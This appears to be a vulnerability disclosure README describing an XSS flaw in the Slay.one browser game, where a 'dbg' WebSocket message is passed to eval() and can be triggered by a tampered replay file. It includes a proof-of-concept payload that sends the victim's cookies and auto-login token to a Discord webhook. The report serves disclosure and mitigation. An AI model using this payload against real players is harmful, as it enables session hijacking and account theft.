
<div align="center">
  <img src="./imgs/logo.png" alt="Logo" />
</div>

# Exploit Report 'dbg' 
This repository documents a vulnerability, for cross-site scripting (XSS) attacks, in Slay.one's, a popular web-based pixel shooter game, replay files.

## Introduction 
[Slay.one](https://slay.one) is a popular web-based, top-down pixel shooter game. Despite its engaging gameplay, it suffers from a serious vulnerability that exposes users to cross-site scripting (XSS) attacks. This report outlines the nature of the vulnerability, how it can be exploited, and recommendations for mitigating the risk.

## Proof of Concept (PoC)
The vulnerability resides in the `client-bundle.js` file, specifically in the code responsible for processing WebSocket messages from the server. The problematic section of code is as follows:

```javascript
else if ("dbg" === arr[0]) // 'dbg' packet sent from the server
    try {
        eval(msg.substring(4)); // eval() allows arbitrary code execution
    } catch (e) {}
```

Here, the use of `eval()` poses a critical security risk, as it allows the execution of arbitrary JavaScript code passed within WebSocket messages.

### Exploitation
Attackers can exploit this vulnerability using Slay.one's replay feature, which lets users download and upload game replays. A replay file can be modified to include malicious code that executes in the victim’s browser when the file is uploaded and viewed.

### Proof of Concept Code
The following example demonstrates how an attacker could edit a replay file to exploit this vulnerability. When the replay is loaded, the malicious code steals the user’s cookies and authentication tokens, sending them to a Discord webhook.

#### Malicious Code Example
```javascript
dbg$fetch('https://discord.com/api/webhooks/{webhookID}/{webhookToken}', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        content: 'Stolen Cookies: ' + document.cookie + 
                 ' Login Token: ' + localStorage.autologin
    })
});
```

### Potential Effects
Exploiting this vulnerability allows attackers to:
- **Hijack user sessions**: Stolen cookies can be used to impersonate users.
- **Steal sensitive information**: Attackers can access authentication tokens stored in `localStorage`.
- **Execute arbitrary code**: This can lead to additional compromises, including malware delivery or unauthorized actions.

## Recommendations for Mitigation
To address this vulnerability and improve overall security, the following measures are recommended:

- **Eliminate `eval()` usage**: 
- **Validate and sanitize inputs**
- **Implement Content Security Policy (CSP)**
- **Enhance WebSocket security**: 

---

By implementing these measures, Slay.one can significantly reduce the risk of XSS attacks, providing a safer and more secure experience for its players.
